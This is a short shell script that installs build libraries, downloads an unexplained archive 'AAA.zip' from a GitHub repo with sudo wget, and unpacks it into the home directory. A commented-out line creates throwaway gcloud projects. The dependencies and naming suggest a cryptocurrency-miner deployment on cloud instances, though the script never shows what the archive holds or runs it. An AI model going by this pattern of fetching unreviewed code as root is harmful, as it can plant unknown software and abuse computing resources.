sudo apt-get update

#project=$(date +"%d%m%Y%H%M%S")
#gcloud config set project $project
sudo apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev ocl-icd-opencl-dev unzip
sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
sudo unzip AAA.zip
#sudo rm -rf "$HOME"/AAA #IF****
sudo mv AAA "$HOME"
sudo rm -rf AAA.zip
